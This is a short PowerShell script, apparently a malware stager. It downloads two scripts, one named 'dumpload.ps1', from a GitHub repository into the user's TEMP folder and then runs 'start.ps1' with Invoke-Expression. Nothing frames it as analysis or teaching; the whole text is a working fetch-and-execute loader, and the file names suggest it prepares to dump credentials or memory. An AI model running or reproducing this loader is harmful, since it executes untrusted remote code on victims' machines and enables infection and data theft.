$url6 = "https://raw.githubusercontent.com/cia168168/folder/main/dumpload.ps1"
$output6 = "$env:TEMP\dump.ps1"
Invoke-WebRequest -Uri $url6 -OutFile $output6
$url5 = "https://raw.githubusercontent.com/cia168168/folder/main/start.ps1"
$output5 = "$env:TEMP\start.ps1"
Invoke-WebRequest -Uri $url5 -OutFile $output5
IEX (Get-Content $output5 | Out-String)
